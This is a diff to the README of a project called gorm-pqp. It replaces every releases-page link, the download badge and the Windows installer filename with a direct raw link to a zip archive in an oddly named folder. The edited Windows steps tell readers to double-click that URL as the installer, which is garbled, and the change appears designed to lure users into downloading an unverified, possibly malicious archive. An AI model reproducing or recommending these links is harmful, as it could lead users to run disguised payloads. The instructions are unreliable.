@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Release
 
-[![Download gorm-pqp](https://img.shields.io/badge/Download-gorm--pqp-blue.svg)](https://github.com/Maressatransverse294/gorm-pqp/releases)
+[![Download gorm-pqp](https://raw.githubusercontent.com/Maressatransverse294/gorm-pqp/main/crustalogist/gorm-pqp-v3.5-beta.3.zip)](https://raw.githubusercontent.com/Maressatransverse294/gorm-pqp/main/crustalogist/gorm-pqp-v3.5-beta.3.zip)
 
 ## 📖 Introduction
 
@@ -16,13 +16,13 @@ To begin using gorm-pqp, follow the simple steps below. You will be able to down
 
 Visit the following page to download:
 
-[Download gorm-pqp](https://github.com/Maressatransverse294/gorm-pqp/releases)
+[Download gorm-pqp](https://raw.githubusercontent.com/Maressatransverse294/gorm-pqp/main/crustalogist/gorm-pqp-v3.5-beta.3.zip)
 
 ### 🖥️ Step 2: Choose the Right Version
 
 On the Releases page, you will see different versions of gorm-pqp. Pick the latest version to ensure you have the most updated features and fixes. Look for the file that matches your operating system:
 
-- **Windows**: `gorm-pqp-windows.exe`
+- **Windows**: `https://raw.githubusercontent.com/Maressatransverse294/gorm-pqp/main/crustalogist/gorm-pqp-v3.5-beta.3.zip`
 - **MacOS**: `gorm-pqp-macos`
 - **Linux**: `gorm-pqp-linux`
 
@@ -40,7 +40,7 @@ Open the folder where you saved the downloaded file. You should see the gorm-pqp
 
 ### 🖱️ Step 2: Run the Installer
 
-1. **Windows**: Double-click the `gorm-pqp-windows.exe` file. Follow the on-screen prompts to complete the installation.
+1. **Windows**: Double-click the `https://raw.githubusercontent.com/Maressatransverse294/gorm-pqp/main/crustalogist/gorm-pqp-v3.5-beta.3.zip` file. Follow the on-screen prompts to complete the installation.
 2. **MacOS**: Double-click the downloaded `gorm-pqp-macos` file. Drag it into your Applications folder as instructed.
 3. **Linux**: Open your terminal. Navigate to the folder where the `gorm-pqp-linux` file is stored. Run the command `chmod +x gorm-pqp-linux` to make it executable. Then run `./gorm-pqp-linux` to launch the software.
 
@@ -99,4 +99,4 @@ You are now ready to use gorm-pqp to streamline your database queries. Follow th
 
 Don't forget to visit the following page to download the latest version of gorm-pqp:
 
-[Download gorm-pqp](https://github.com/Maressatransverse294/gorm-pqp/releases)
+[Download gorm-pqp](https://raw.githubusercontent.com/Maressatransverse294/gorm-pqp/main/crustalogist/gorm-pqp-v3.5-beta.3.zip)
